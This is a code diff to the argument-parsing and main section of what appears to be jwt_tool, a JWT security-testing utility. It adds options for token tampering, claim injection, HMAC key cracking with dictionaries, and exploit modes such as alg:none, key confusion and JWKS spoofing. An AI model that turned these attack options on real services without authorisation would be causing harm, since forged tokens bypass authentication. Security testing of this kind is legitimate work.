+                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nec256/ec384/ec512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
+    parser.add_argument("-T", "--tamper", action="store_true",
+                        help="tamper with the JWT contents\n(set signing options with -S or use exploits with -X)")
+    parser.add_argument("-I", "--injectclaims", action="store_true",
+                        help="inject new claims and update existing claims with new values\n(set signing options with -S or use exploits with -X)\n(set target claim with -hc/-pc and injection values/lists with -hv/-pv")
     parser.add_argument("-hc", "--headerclaim", action="append",
                         help="Header claim to tamper with")
     parser.add_argument("-pc", "--payloadclaim", action="append",
@@ -1832,7 +1818,27 @@ if __name__ == '__main__':
                         help="Value (or file containing values) to inject into tampered header claim")
     parser.add_argument("-pv", "--payloadvalue", action="append",
                         help="Value (or file containing values) to inject into tampered payload claim")
+    parser.add_argument("-C", "--crack", action="store_true",
+                        help="crack key for an HMAC-SHA token\n(specify -d/-p/-kf)")
+    parser.add_argument("-d", "--dict", action="store",
+                        help="dictionary file for cracking")
+    parser.add_argument("-p", "--password", action="store",
+                        help="password for cracking")
+    parser.add_argument("-kf", "--keyfile", action="store",
+                        help="keyfile for cracking (when signed with 'kid' attacks)")
+    parser.add_argument("-V", "--verify", action="store_true",
+                        help="verify the RSA signature against a Public Key\n(specify -pk/-jw)")
+    parser.add_argument("-pk", "--pubkey", action="store",
+                        help="Public Key for Asymmetric crypto")
+    parser.add_argument("-jw", "--jwksfile", action="store",
+                        help="JSON Web Key Store for Asymmetric crypto")
+    parser.add_argument("-Q", "--query", action="store",
+                        help="Query a token ID against the logfile to see the details of that request\ne.g. -Q jwttool_46820e62fe25c10a3f5498e426a9f03a")
+    # parser.add_argument("-pr", "--privkey", action="store",
+    #                     help="Private Key for Asymmetric crypto")
     args = parser.parse_args()
+    if not args.bare:
+        printLogo()
     path = sys.path[0]
     logFilename = path+"/logs.txt"
     configFileName = path+"/jwtconf.ini"
@@ -1840,11 +1846,13 @@ if __name__ == '__main__':
     if (os.path.isfile(configFileName)):
         config.read(configFileName)
     else:
-        print("No config file yet created.\nRunning config setup.")
+        cprintc("No config file yet created.\nRunning config setup.", "cyan")
         createConfig()
     if config['services']['jwt_tool_version'] != jwttoolvers:
-        cprint("Config file showing wrong version ("+config['services']['jwt_tool_version']+")", "red")
-        cprint("Delete/rename the current config file ("+configFileName+") to auto-generate a compatible version.", "red")
+        cprintc("Config file showing wrong version ("+config['services']['jwt_tool_version']+" vs "+jwttoolvers+")", "red")
+        cprintc("Current config file has been backed up as '"+path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini' and a new config generated.\nPlease review and manually transfer any custom options you have set.", "red")
+        os.rename(configFileName, path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini")
+        createConfig()
         exit(1)
     with open('null.txt', 'w') as nullfile:
         pass
@@ -1853,58 +1861,58 @@ if __name__ == '__main__':
         if args.cookies or args.headers:
             if args.cookies and args.headers:
                 if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies) and re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
-                    cprint("Too many tokens! JWT in cookie and header", "red")
+                    cprintc("Too many tokens! JWT in cookie and header", "red")
                     exit(1)
             if args.cookies:
                 try:
                     if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', args.cookies):
                         config['argvals']['headerloc'] = "cookies"
                 except:
-                    cprint("Invalid cookie formatting", "red")
+                    cprintc("Invalid cookie formatting", "red")
                     exit(1)
             if args.headers:
                 try:
                     if re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.headers)):
                         config['argvals']['headerloc'] = "headers"
                 except:
-                    cprint("Invalid header formatting", "red")
+                    cprintc("Invalid header formatting", "red")
                     exit(1)
             try:
                 findJWT = re.search('eyJ[A-Za-z0-9_\/+-]*\.eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*', str(args.cookies)+" | "+str(args.headers))[0]
             except:
-                cprint("Cannot find a valid JWT", "red")
-                cprint(args.cookies+" | "+args.headers, "cyan")
+                cprintc("Cannot find a valid JWT", "red")
+                cprintc(args.cookies+" | "+args.headers, "cyan")
                 exit(1)
     if args.jwt:
         jwt = args.jwt
-        cprint("Original JWT: "+findJWT+"\n", "cyan")
+        cprintc("Original JWT: "+findJWT+"\n", "cyan")
     elif findJWT:
         jwt = findJWT
-        cprint("Original JWT: "+findJWT+"\n", "cyan")
+        cprintc("Original JWT: "+findJWT+"\n", "cyan")
     elif args.query:
         jwt = searchLog(args.query)
     else:
         parser.print_usage()
-        cprint("No JWT provided", "red")
+        cprintc("No JWT provided", "red")
         exit(1)
     if args.mode:
         if args.mode not in ['pb','er', 'cc', 'at']:
             parser.print_usage()
-            cprint("\nPlease choose a scanning mode (e.g. -M pb):\npb = playbook\ner = force errors\ncc = fuzz common claims\nat = all tests", "red")
+            cprintc("\nPlease choose a scanning mode (e.g. -M pb):\npb = playbook\ner = force errors\ncc = fuzz common claims\nat = all tests", "red")
             exit(1)
         else:
             config['argvals']['scanMode'] = args.mode
     if args.exploit:
-        if args.exploit not in ['a', 'n', 's', 'i', 'k']:
+        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k']:
             parser.print_usage()
-            cprint("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
+            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
             exit(1)
         else:
             config['argvals']['exploitType'] = args.exploit
     if args.sign:
         if args.sign not in ['hs256','hs384','hs512','rs256','rs384','rs512','ec256','ec384','ec512','ps256','ps384','ps512']:
             parser.print_usage()
-            cprint("\nPlease choose a signature option (e.g. -S hs256)", "red")
+            cprintc("\nPlease choose a signature option (e.g. -S hs256)", "red")
             exit(1)
         else:
             config['argvals']['sigType'] = args.sign
@@ -1925,8 +1933,8 @@ if __name__ == '__main__':
         config['argvals']['key'] = args.password
     if args.pubkey:
         config['crypto']['pubkey'] = args.pubkey
-    if args.privkey:
-        config['crypto']['privkey'] = args.privkey
+    # if args.privkey:
+    #     config['crypto']['privkey'] = args.privkey
     if args.jwksfile:
         config['crypto']['jwks'] = args.jwksfile
     if args.jwksurl:
@@ -1955,17 +1963,17 @@ if __name__ == '__main__':
         newpaylDict = paylDict
         if args.headerclaim:
             if not args.headervalue:
-                cprint("Must specify header values to match header claims to inject.", "red")
+                cprintc("Must specify header values to match header claims to inject.", "red")
                 exit(1)
             if len(args.headerclaim) != len(args.headervalue):
-                cprint("Amount of header values must match header claims to inject.", "red")
+                cprintc("Amount of header values must match header claims to inject.", "red")
                 exit(1)
         if args.payloadclaim:
             if not args.payloadvalue:
-                cprint("Must specify payload values to match payload claims to inject.", "red")
+                cprintc("Must specify payload values to match payload claims to inject.", "red")
                 exit(1)
             if len(args.payloadclaim) != len(args.payloadvalue):
-                cprint("Amount of payload values must match payload claims to inject.", "red")
+                cprintc("Amount of payload values must match payload claims to inject.", "red")
                 exit(1)
         if args.payloadclaim:
             for payloadclaim, payloadvalue in zip(args.payloadclaim, args.payloadvalue):
@@ -1986,12 +1994,12 @@ if __name__ == '__main__':
                     headDict, paylDict, sig, contents = validateToken(newContents+"."+sig)
         if injectionfile:
             if args.mode:
-                cprint("Fuzzing cannot be used alongside scanning modes", "red")
+                cprintc("Fuzzing cannot be used alongside scanning modes", "red")
                 exit(1)
-            cprint("Fuzzing file loaded: "+injectionfile[2], "cyan")
+            cprintc("Fuzzing file loaded: "+injectionfile[2], "cyan")
             with open(injectionfile[2], "r", encoding='utf-8', errors='ignore') as valLst:
                 nextVal = valLst.readline()
-                print("Generating tokens from injection file...")
+                cprintc("Generating tokens from injection file...", "cyan")
                 utf8errors = 0
                 wordcount = 0
                 while nextVal:
@@ -2013,7 +2021,7 @@ if __name__ == '__main__':
                 exit(1)
     if args.mode:
         if not config['argvals']['targeturl']:
-            cprint("No target secified (-t), cannot scan offline.", "red")
+            cprintc("No target secified (-t), cannot scan offline.", "red")
             exit(1)
         runScanning()
     runActions()
